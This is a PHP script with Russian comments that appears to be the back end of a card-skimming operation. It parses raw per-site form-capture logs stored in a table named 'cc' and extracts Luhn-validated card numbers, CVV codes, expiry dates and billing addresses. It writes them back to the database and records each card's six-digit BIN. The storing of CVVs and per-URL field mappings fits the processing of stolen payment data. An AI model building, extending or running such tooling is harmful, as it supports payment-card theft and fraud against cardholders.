<?php
require 'config.php'; 

function formatExpirationDate($date) {
    $date = preg_replace('/\s+/', '', $date);
    
    // Если дата уже в формате MM/YY или MM/YYYY, возвращаем как есть
    if (preg_match('/^\d{1,2}\/\d{2}(\d{2})?$/', $date)) {
        return $date;
    }
    
    if (preg_match('/^(\d{1,2})-[a-zA-Z]+$/', $date, $matches)) {
        $month = str_pad($matches[1], 2, '0', STR_PAD_LEFT);
        return "$month";
    }
    
    if (preg_match('/^(\d{1,2})(\d{2})(\d{2})?$/', $date, $matches)) {
        $month = str_pad($matches[1], 2, '0', STR_PAD_LEFT);
        $year = isset($matches[3]) ? $matches[2] . $matches[3] : $matches[2];
        return "$month/$year";
    }
    
    return $date;
}

function formatExpirationDates($dates) {
    $formattedDates = [];
    $dateArray = explode(',', $dates);
    
    foreach ($dateArray as $date) {
        $date = trim($date);
        $formattedDates[] = formatExpirationDate($date);
    }
    
    return implode(', ', $formattedDates);
}

function luhnCheck($number) {
    $sum = 0;
    $numDigits = strlen($number);
    $parity = $numDigits % 2;
    for ($i = $numDigits - 1; $i >= 0; $i--) {
        $digit = intval($number[$i]);
        if ($i % 2 == $parity) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }
    return ($sum % 10 == 0);
}

function removeDuplicateValues($values) {
    $result = [];
    $lastValue = null;
    foreach (explode(', ', $values) as $value) {
        if ($value !== $lastValue) {
            $result[] = $value;
            $lastValue = $value;
        }
    }
    return implode(', ', $result);
}

function extractValuesFromDataLog($dataLog, $mappings) {
    $dataLogArray = json_decode($dataLog, true);
    $extractedValues = [];
    $ccNumbers = [];
    $ccExpMonths = [];
    $ccExpYears = [];
    $ccCids = [];
    $addressParts = [];

    if (!is_array($dataLogArray)) {
        return $extractedValues;
    }

    foreach ($dataLogArray as $item) {
        $parts = explode(':', $item, 2);
        if (count($parts) == 2) {
            list($key, $value) = $parts;
            $value = trim($value);

            foreach ($mappings as $fieldKey => $assignAs) {
                if (strpos($key, $fieldKey) === 0) {
                    if ($assignAs == 'payment_cc_number') {
                        $cardNumbers = explode(',', $value);
                        foreach ($cardNumbers as $cardNumber) {
                            $cardNumber = preg_replace('/[\s\t\n\r-]+/', '', $cardNumber);
                            if (!preg_match('/[a-zA-Z]/', $cardNumber) &&
                                strlen($cardNumber) >= 13 && strlen($cardNumber) <= 19 &&
                                luhnCheck($cardNumber)) {
                                $ccNumbers[] = $cardNumber;
                            }
                        }
                    } elseif ($assignAs == 'payment_cc_cid') {
                        if (preg_match('/^\d{3,4}$/', $value)) {
                            $ccCids[] = $value;
                        }
                    } elseif ($assignAs == 'payment_cc_exp_month') {
                        $ccExpMonths[] = $value;
                    } elseif ($assignAs == 'payment_cc_exp_year') {
                        $ccExpYears[] = $value;
                    } elseif ($assignAs == 'billing_street') {
                        $addressParts[] = $value;
                    } else {
                        if (!isset($extractedValues[$assignAs]) || $extractedValues[$assignAs] != $value) {
                            $extractedValues[$assignAs] = $value;
                        }
                    }
                }
            }
        }
    }

    // Обновляем только если найдены соответствующие данные
    if (!empty($ccNumbers)) {
        $extractedValues['payment_cc_number'] = implode(', ', array_unique($ccNumbers));
    }

    if (!empty($ccCids)) {
        $extractedValues['payment_cc_cid'] = implode(', ', array_unique($ccCids));
    }

    if (!empty($addressParts)) {
        $extractedValues['billing_street'] = implode(', ', array_unique($addressParts));
    }

    // Обработка даты истечения срока действия карты
     if (!empty($ccExpMonths) || !empty($ccExpYears)) {
        $expDates = [];
        $maxCount = max(count($ccExpMonths), count($ccExpYears));
        for ($i = 0; $i < $maxCount; $i++) {
            $month = isset($ccExpMonths[$i]) ? str_pad(trim($ccExpMonths[$i]), 2, '0', STR_PAD_LEFT) : '';
            $year = isset($ccExpYears[$i]) ? trim($ccExpYears[$i]) : '';
            if ($month && $year) {
                $expDates[] = "$month/$year";
            } elseif ($month) {
                $expDates[] = $month;
            } elseif ($year) {
                $expDates[] = $year;
            }
        }
        $extractedValues['payment_cc_exp_month'] = implode(', ', array_unique($expDates));
        // Не устанавливаем payment_cc_exp_year, так как оно теперь включено в payment_cc_exp_month
    }

    return $extractedValues;
}

function separateMonthAndYear($date) {
    $date = trim($date);
    if (strlen($date) == 2) {
        // Если длина 2, считаем это месяцем
        return ['month' => $date, 'year' => null];
    }
    $parts = explode('/', $date);
    if (count($parts) == 2) {
        $month = $parts[0];
        $year = $parts[1];
    } elseif (strlen($date) == 4) {
        $month = substr($date, 0, 2);
        $year = substr($date, 2, 2);
    } else {
        return ['month' => $date, 'year' => null];
    }
    
    // Если год представлен двумя цифрами, добавляем '20' в начало
    if (strlen($year) == 2) {
        $year = '20' . $year;
    }
    return ['month' => $month, 'year' => $year];
}

$mappingResult = $db->query("SELECT * FROM field_mappings WHERE block IS NULL");
$mappings = [];
while ($mappingRow = $mappingResult->fetch_assoc()) {
    $mappings[$mappingRow['url_id']][$mappingRow['field_key']] = $mappingRow['assign_as'];
}

$result = $db->query("SELECT * FROM cc");
while ($row = $result->fetch_assoc()) {
    if (isset($mappings[$row['url_id']])) {
        $extractedValues = extractValuesFromDataLog($row['fulldatalog'], $mappings[$row['url_id']]);
        
        if (isset($extractedValues['payment_cc_exp_month'])) {
    $months = explode(', ', $extractedValues['payment_cc_exp_month']);
    $years = explode(', ', $extractedValues['payment_cc_exp_year']);
    
    $formattedDates = [];
    for ($i = 0; $i < max(count($months), count($years)); $i++) {
        $month = isset($months[$i]) ? $months[$i] : '';
        $year = isset($years[$i]) ? $years[$i] : '';
        $formattedDates[] = formatExpirationDate($month . $year);
    }
    
    $extractedValues['payment_cc_exp_month'] = implode(', ', $formattedDates);
}

// Удалим отдельную обработку payment_cc_exp_year, так как теперь она включена в payment_cc_exp_month

foreach (['payment_cc_exp_month', 'payment_cc_cid'] as $field) {
    if (isset($extractedValues[$field])) {
        $values = explode(', ', $extractedValues[$field]);
        $extractedValues[$field] = implode(', ', array_unique($values));
    }
}
        
        $updateParts = [];
        foreach ($extractedValues as $key => $value) {
            $updateParts[] = "`$key` = '" . $db->real_escape_string($value) . "'";
        }

        if (count($updateParts) > 0) {
            $updateQuery = "UPDATE cc SET " . implode(", ", $updateParts) . " WHERE id = " . $row['id'];
            $db->query($updateQuery);
        }
        
        if (isset($extractedValues['payment_cc_number'])) {
            $ccNumbers = explode(', ', $extractedValues['payment_cc_number']);
            $types = [];

            foreach ($ccNumbers as $ccNumber) {
                $ccNumber = preg_replace('/\s+/', '', $ccNumber);
                if (preg_match('/^\d{6}/', $ccNumber, $matches)) {
                    $types[] = $matches[0];
                }
            }

            if (!empty($types)) {
                $type = implode(', ', $types);
                $updateTypeQuery = "UPDATE cc SET `type` = '" . $db->real_escape_string($type) . "' WHERE id = " . $row['id'];
                $db->query($updateTypeQuery);
            }
        }
    }
}

$db->close();
?>